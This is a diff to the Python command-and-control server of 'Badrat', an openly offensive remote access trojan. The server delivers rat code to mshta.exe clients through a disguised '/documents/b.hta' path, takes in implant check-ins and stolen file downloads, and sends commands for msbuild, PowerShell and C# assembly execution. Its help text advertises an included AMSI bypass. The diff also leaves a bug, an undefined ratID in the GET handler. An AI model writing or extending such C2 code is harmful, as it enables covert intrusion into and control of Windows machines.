@@ -18,18 +18,17 @@ import os
 
 # CSCI 201 teacher: Noooo you can't just use global variables to make things easier
 # haha, global variables go brrr
-RED = '\033[91m'
-ENDC = '\033[0m'
-UNDERLINE = '\033[4m'
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-p", "--port", help="Port to start the HTTP(S) server on", default=8080, action="store", dest="port")
 parser.add_argument("-s", "--ssl", help="Start listener using HTTPS instead of HTTP (default)", default=False, action="store_true", dest="ssl")
+parser.add_argument("-v", "--verbose", help="Start Badrat in debug/verbose mode for troubleshooting", default=False, action="store_true", dest="verbose")
 args = parser.parse_args()
 port = args.port
 ssl = args.ssl
+verbose = args.verbose
 
-supported_types = ["c", "py", "js", "ps1", "hta"]
+supported_types = ["c", "c#", "js", "ps1", "hta"]
 msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild"
 alpha = "abcdefghijklmnopqrstuvwxyz"
 
@@ -51,7 +50,7 @@ def print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.1.1 Kinda-okay Rat           "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.2.1 C# Good, Powershell Bad  "`
     """
     print(banner)
 
@@ -77,12 +76,14 @@ def htmlify(data):
 # Print colors according to the rat type
 def colors(value):
     BOLD = '\033[1m'
+    ENDC = '\033[0m'
+    UNDERLINE = '\033[4m'
     c = '\033[91m'    # Red
-    py = '\033[92m'   # Green
+    cs = '\033[92m'   # Green
     js = '\033[93m'   # Yellow
     ps1 = '\033[94m'  # Blue
     hta = '\033[95m'  # Purple
-    colors = {"c":c, "py":py, "js":js, "ps1":ps1, "hta":hta}
+    colors = {"c":c, "c#":cs, "js":js, "ps1":ps1, "hta":hta}
     if(value in colors.keys()):
         return(colors[value] + value + ENDC)
     elif(value in types.keys()):
@@ -105,10 +106,10 @@ def colors(value):
         elif(delta_seconds > 7):
             return(BOLD + js + value + ENDC)
         else:
-            return(BOLD + py + value + ENDC)
+            return(BOLD + cs + value + ENDC)
     except:
         # Truncate reeeeally long commands over 120 characters
-        if(len(value) > 120):
+        if(len(value) > 120 and not verbose):
             return(UNDERLINE + value[0:116] + ENDC + "...")
         else:
             return(UNDERLINE + value + ENDC)
@@ -131,7 +132,7 @@ def encode_file(filepath):
     with open(Path(filepath).resolve() , "rb") as fd:
         data = fd.read()
     b64data = base64.b64encode(data).decode('utf-8')
-    return(b64data)   
+    return(b64data)
 
 def create_psscript(filepath, extra_cmds=""):
     with open(Path(filepath).resolve() , "r") as fd:
@@ -248,13 +249,12 @@ def serve_server(port=8080):
     @app.route('/<path:path>', methods=['GET'])
     def badrat_get(path):
         user_agent = request.headers['User-Agent']
-        # Path must be /<ratID>/r/b.hta AND user agent belongs to mshta.exe
-        if("/r/b.hta" in path and "MSIE" in user_agent and ".NET" in user_agent and "Windows NT" in user_agent and path.split("/")[0] in rats.keys()):
-            ratID = path.split("/")[0]
+        # Path must be /documents/b.hta AND user agent belongs to mshta.exe
+        if("/documents/b.hta" in path and "MSIE" in user_agent and ".NET" in user_agent and "Windows NT" in user_agent):
             return(send_ratcode(ratID))
-        else:
-            print("[!] GET request from non-rat client requested path /" + path)
-            return(default_page())
+        elif(verbose):
+            print("[v] GET request from non-rat client requested path /" + path)
+        return(default_page())
 
     @app.route('/', defaults={'path': ''})
     @app.route('/<path:path>', methods=['POST'])
@@ -277,6 +277,8 @@ def serve_server(port=8080):
         rats[ratID] = checkin
         types[ratID] = ratType
         usernames[ratID] = username
+        if(verbose):
+            print("[v] rat " + colors(ratID) + " sent data: " + str(post_json))
 
         # If there is no current command for a rat, create a blank one
         if(ratID not in commands):
@@ -296,6 +298,9 @@ def serve_server(port=8080):
             print("\n[*] File download from rat " + colors(ratID) + " saved to downloads/" + colors(ratID) + "." + rand)
 
         return(htmlify(json.dumps({"cmnd": commands[ratID]})))
+
+    if(verbose):
+        print("[v] Starting badrat in verbose mode. Prepare to have your screen flooded.")
 
     # Run the listener. Choose between HTTP and HTTPS based on if --ssl was specfied
     if(ssl):
@@ -360,7 +365,7 @@ def get_help():
     print("-------------------------------------------------------------------------")
     print("")
     print("Extra things to know:")
-    print("The rats are written in Windows JScript and Powershell, run in a cscript.exe/wscript.exe, mshta.exe, or powershell.exe process")
+    print("The rats are written in Windows JScript, Powershell and C#, run in a cscript.exe/wscript.exe, mshta.exe, powershell.exe, or standard exe process")
     print("The server is written in python and uses an HTTP(S) listener for C2 comms")
     print("Rats are SINGLE THREADED, which means long running commands will lock up the rat. Try spawning a new rat before running risky commands")
     print("Some rats need to write to disk for execution or cmd output. Every rat that must write to disk cleans up files created.")
@@ -368,7 +373,6 @@ def get_help():
     print("Rats are designed to use methods native to their type as much as possible. E.g.: HTA rat will never use Powershell.exe, and the Powershell rat will never use cmd.exe")
     print("Tal Liberman's AMSI Bypass is included by default for msbuild psh execution (js and hta ONLY). This may not be desireable and can be turned off by changing the variable at the beginning of this script")
     print("All assemblies run with \"cs\" must be compiled with a public Main method and a public class that contains Main\n")
-
 
 if __name__ == "__main__":
     # Start the Flask server
@@ -383,7 +387,7 @@ if __name__ == "__main__":
 
     # Badrat main menu loop
     while True:
-        inp = input(UNDERLINE + "Badrat" + ENDC + " //> ")
+        inp = input(colors("Badrat") + " //> ")
 
         # Check if the operator wants to quit badrat
         if(inp == "exit"):
@@ -445,7 +449,7 @@ if __name__ == "__main__":
                                 extra_cmds = " ".join(inp.split(" ")[2:])
                             except:
                                 pass
-                            if(types[ratID] == "ps1"):
+                            if(types[ratID] == "ps1" or types[ratID] == "c#"):
                                 inp = "psh " + create_psscript(filepath, extra_cmds)
                             else:
                                 inp = "psh " + msbuild_path + " " + send_nps_msbuild_xml(inp, ratID)
@@ -458,6 +462,8 @@ if __name__ == "__main__":
                             filepath = inp.split(" ")[1]
                             if(types[ratID] == "ps1"):
                                 inp = "cs " + send_invoke_assembly(inp)
+                            elif(types[ratID] == "c#"):
+                                inp = "cs " + encode_file(filepath) + " " + parse_c_sharp_args(inp)
                             else:
                                 inp = "cs " + msbuild_path + " " + send_csharper_msbuild_xml(inp, ratID)
                         except:
